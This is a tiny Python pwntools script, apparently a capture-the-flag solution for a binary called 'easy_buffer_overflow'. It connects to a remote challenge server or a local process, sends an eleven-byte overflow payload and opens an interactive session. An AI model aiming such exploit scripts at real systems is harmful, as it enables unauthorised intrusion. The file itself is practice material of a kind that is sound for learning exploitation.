from pwn import *

if len(sys.argv) > 1:
	sh=remote("128.199.104.41",29458)
else:
	sh=process("./easy_buffer_overflow")

sh.sendline("a"*11)

sh.interactive()